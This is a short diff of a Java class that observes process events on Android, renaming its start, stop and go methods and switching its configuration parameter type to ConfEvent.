@@ -14,6 +14,7 @@ import java.io.IOException;
 import com.android.service.ProcessInfo;
 import com.android.service.ProcessStatus;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerProcess;
@@ -32,17 +33,17 @@ public class EventProcess extends BaseEvent implements Observer<ProcessInfo> {
 	private boolean focus;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		ListenerProcess.self().attach(this);
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		ListenerProcess.self().detach(this);
 	}
 
 	@Override
-	public boolean parse(EventConf conf) {
+	public boolean parse(ConfEvent conf) {
 		try {
 			window = conf.getBoolean("window");
 			focus = conf.getBoolean("focus");
@@ -59,7 +60,7 @@ public class EventProcess extends BaseEvent implements Observer<ProcessInfo> {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 
 	}
 
